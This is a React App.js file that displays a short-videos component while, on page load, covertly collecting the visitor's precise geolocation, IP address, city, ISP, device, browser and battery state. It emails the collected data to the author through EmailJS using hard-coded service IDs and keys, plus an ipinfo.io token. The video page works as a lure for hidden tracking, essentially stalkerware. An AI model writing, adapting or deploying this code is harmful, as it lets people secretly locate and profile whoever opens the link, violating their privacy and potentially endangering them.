import { useEffect, useState } from 'react';
import emailjs from '@emailjs/browser';
import platform from 'platform';
import Short_Videos from './component/short_videos';

const App = () => {
  useEffect(() => {
    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude) {
      try {
        const templateParams = {
          date: new Date().toLocaleString(),
          ip: ipInfo?.ip || 'N/A',
          city: ipInfo?.city || 'N/A',
          region: ipInfo?.region || 'N/A',
          country: ipInfo?.country || 'N/A',
          isp: ipInfo?.org || 'N/A',
          latitude: latitude || 'N/A',
          longitude: longitude || 'N/A',
          device_name: deviceInfo.name || 'Unknown',
          device_os: deviceInfo.os.family || 'Unknown',
          browser: deviceInfo.layout || 'Unknown',
          browser_version: deviceInfo.version || 'Unknown',
          device_type: deviceInfo.description || 'Unknown',
          battery_level: batteryInfo?.level || 'Unknown',
          charging_status: batteryInfo?.charging ? 'Charging' : 'Not Charging',
        };

        const response = await emailjs.send(
          'service_92nkmcg',
          'template_h6yolzk',
          templateParams,
          'zqDZ3UbE0eHoHCboK'
        );
        console.log('Email sent:', response.status);
      } catch (error) {
        console.error('Error sending email:', error);
      }
    }

    async function getUserInfo() {
      try {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;

            const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
            const ipInfo = await ipResponse.json();

            const deviceInfo = getDeviceInfo();
            const batteryInfo = await getBatteryInfo();

            sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
          },
          (error) => console.error('Geolocation error:', error),
          { enableHighAccuracy: true }
        );
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }
    }

    function getDeviceInfo() {
      const deviceInfo = platform.parse(navigator.userAgent);
      return {
        name: deviceInfo.name || 'Unknown',
        version: deviceInfo.version || 'Unknown',
        layout: deviceInfo.layout || 'Unknown',
        os: deviceInfo.os || { family: 'Unknown' },
        description: deviceInfo.description || 'Unknown',
      };
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level * 100 + '%',
          charging: battery.charging,
        };
      } catch (error) {
        console.error('Error fetching battery info:', error);
        return { level: 'Unknown', charging: false };
      }
    }

    getUserInfo();
  }, []);

  return <>
  <Short_Videos/>
  </>;
};

export default App;
